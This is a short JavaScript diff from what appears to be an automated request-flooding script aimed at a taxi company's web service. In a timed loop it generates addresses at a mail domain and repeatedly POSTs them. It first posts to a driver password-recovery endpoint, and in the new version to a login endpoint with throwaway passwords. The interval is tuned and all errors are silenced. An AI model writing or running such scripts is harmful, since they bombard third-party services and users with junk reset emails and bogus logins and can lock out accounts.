@@ -33,8 +33,7 @@ setInterval(() => {
             email += "@yandex.ru"
 
             try {
-                axios.post("https://drivers.jump.taxi/ajax/auth-recovery.php", { email: email }).then(result => {}).catch(err => {});
-
+                axios.post("https://api.jump.taxi/v2/auth/scenario", {login:email,password:String(Date.now())}).then(result => {}).catch(err => {});
             } catch (e) {
                 console.log("e: " + 3)
             }
@@ -42,4 +41,4 @@ setInterval(() => {
     } catch (err) {
         console.log("err: "+ err)
     }
-}, 100);
+}, 1100);
